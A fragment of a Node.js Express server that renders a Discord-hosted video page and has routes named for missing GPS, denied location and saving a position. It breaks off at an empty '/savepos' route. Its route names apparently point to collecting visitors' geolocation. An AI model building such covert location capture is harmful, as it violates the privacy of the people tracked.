const express = require('express'),
	app = express(),
	MongoClient = require('mongodb').MongoClient;

var url = 


app.listen((process.env.PORT || 5001), () => {
	console.log(`Corriendo en puerto ${(process.env.PORT || 5001)}`)
})

app.set('view engine', 'ejs');
app.use(express.static('public'));

app.get('/', (req, res) => {
	res.render('pages/index', {video: 'https://cdn.discordapp.com/attachments/824152375601135646/848470083461709834/xdemonio.mp4'})
})

app.get('/missigngps', (req, res) => {
	res.render('pages/gps');
})

app.get('/denyLocation', (req, res) => {
	res.render('pages/redirect')
})

app.get('/savepos')